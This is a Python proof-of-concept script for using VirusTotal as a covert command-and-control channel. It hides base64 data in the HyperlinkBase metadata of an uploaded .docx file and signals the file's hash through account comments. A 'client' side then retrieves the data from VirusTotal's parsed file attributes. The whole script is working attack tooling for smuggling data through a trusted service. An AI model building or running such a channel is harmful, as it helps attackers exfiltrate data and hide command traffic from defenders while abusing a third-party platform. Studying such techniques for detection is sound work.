import sys
import os
import io
import argparse
import zipfile
import requests
import base64
import time
import random
import string
from pprint import pprint
from datetime import datetime

TemplateFile = 'Template.docx'
ScanTimeout = 120 # seconds
StartUpTime = datetime.now() 
Processed = []

Base = 'https://www.virustotal.com'
Session = requests.session()
Headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
}

Description = """                      
 _____   _   _           _           
|  _  |_| |_| |___ ___ _| |_ _ _____ 
|     | . | . | -_|   | . | | |     |
|__|__|___|___|___|_|_|___|___|_|_|_|
    VirusTotal C2 - Proof of Concept 
"""

def login(username, password):
    global Session

    response = Session.post(Base + '/ui/signin',
        json = { 'data' : {
            'user_id': username,
            'password': password,
            'forever': True
        }},
        headers = Headers
    )

    Session.headers = Headers
    Session.headers['x-session-hash'] = Session.cookies['VT_SESSION_HASH']

    return (response.status_code == 200)


def upload_file(file_data, file_name = TemplateFile):

    response = requests.get(Base + '/ui/files/upload_url', headers = Headers)

    try:
        upload_url = response.json()['data']
    except:
        print('[!] Failed to get upload URL')
        print(response.json())
        return False

    #print('[+] Got Upload URL: ' + upload_url)

    files = {
        'file': (file_name, file_data),
        'filename' : (None, file_name)
    }
    response = requests.post(upload_url, files = files, headers = Headers)

    try:
        return response.json()['data']['id']
    except:
        print('[!] Failed to post file')
        print(response.json())
        return None

def check_file_analysis(id):
    response = requests.get(Base + '/ui/analyses/{}'.format(id), headers = Headers)

    try:
        status = response.json()['data']['attributes']['status']
        sha256 = response.json()['meta']['file_info']['sha256']
        return status, sha256
    except:
        return None, None

def get_file_attributes(hash):
    response = requests.get(Base + '/ui/files/{}'.format(hash), headers = Headers)

    try:
        return response.json()['data']['attributes']
    except:
        print('[!] Failed to get data')
        print(response.json())
        return None

def wrap_with_document(data):
    encoded = base64.b64encode(data)
    nonce = ''.join(random.choice(string.ascii_uppercase) for _ in range(12))
    insertion = b'<HyperlinkBase>' + nonce.encode() + b'|' + encoded + b'</HyperlinkBase>'

    tempate_data = open('template.docx', 'rb').read()
    new_buffer = io.BytesIO()
          
    with zipfile.ZipFile('template.docx', 'r') as zip_in:
        with zipfile.ZipFile(new_buffer, 'w') as zip_out:
            for item in zip_in.infolist():
                data = zip_in.read(item.filename)

                if item.filename == 'docProps/app.xml':
                    data = data.replace(b'</Properties>', insertion + b'</Properties>')
                   
                zip_out.writestr(item, data)

    return new_buffer.getvalue()

def unwrap_from_attributes(attributes):

    try:
        hyperlink_base = attributes['openxml_info']['docprops_app']['HyperlinkBase']
        nonce, encoded = hyperlink_base.split('|')
        data = base64.b64decode(encoded)
    except:
        return None

    return data

def post_comment(hash, comment):
    global Session

    post_data = {
        'data': {
            'type': 'comment',
            'attributes': {
                'text': hash
            }
        }
    }

    response = Session.post(Base + '/ui/files/{}/comments'.format(hash), headers = Headers, json = post_data)

    return response.status_code == 200

def locate_hash_with_comments(username):
    global Processed

    response = requests.get(Base + '/ui/users/{}/comments?relationships=item,author'.format(username), headers = Headers)

    try:
        comments = response.json()['data']

        valid = [ 
            c for c in comments if
            c['relationships']['item']['data']['id'] not in Processed # and \
            #datetime.fromtimestamp(c['attributes']['date']) > StartUpTime
        ]

        print(valid)
        if not valid:
            return None

        latest = valid[0]
        file_hash = latest['relationships']['item']['data']['id']
        Processed.append(file_hash)
        return file_hash
    except:
        return None

def main(args):
    parser = argparse.ArgumentParser(description=Description, formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument('-u', '--username', help="Virus Total username")
    parser.add_argument('-p', '--password', help="Virus Total password")
    parser.add_argument('-s', '--size', help="Test data size to generate (KB)", type=int, default=512)

    args = parser.parse_args()

    print(Description)

    # "Server side"

    print('\n== Server mode ==\n')

    if not login(args.username, args.password):
         print('[!] Failed to login')
         return

    # Load whatever data you'd like here
    data = os.urandom(args.size * 1024)

    file_data = wrap_with_document(data)
    print('[+] Wrapped data in file ({} bytes)'.format(len(data)))

    analysis_id = upload_file(file_data)
    if not analysis_id:
        print('[!] Failed to get analysis ID')
        return

    print('[+] Uploaded file to VT. Analysis: {}'.format(analysis_id))

    print('\n    Waiting for scan to finish ...\n')
    
    time_left = ScanTimeout
    while time_left:
        status, sha256 = check_file_analysis(analysis_id)
            
        if 'completed' not in status.lower() or not sha256:
            time.sleep(5)
            time_left -= 5
        else:
            break

    if not time_left:
        print('[!] Timeout hit waiting for analysis to finish')
        return

    print('[+] File is done. SHA256: ' + sha256)

    if not post_comment(sha256, "Hello"):
        print('[!] Failed to post tracking comment')
        return

    print('[+] Posted tracking comment')
    
    # "Client side code now"

    print('\n== Client mode ==\n')

    found_sha256 = locate_hash_with_comments(args.username.split('@')[0])
    if not found_sha256:
        print('[!] Failed to find file hash')
        return

    print("[+] Found hash in '{}'s comments: {}".format(args.username, found_sha256))

    attributes = get_file_attributes(found_sha256)
    if not attributes:
        print('[!] Failed to get file attributes')
        return

    new_data = unwrap_from_attributes(attributes)
    if not new_data:
        print('[!] Failed to unwrap payload data')
        return

    if new_data != data:
        print('[!] C2 test failed, data does not match')
    else:
        print('\n[+] Data matches!')


if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))
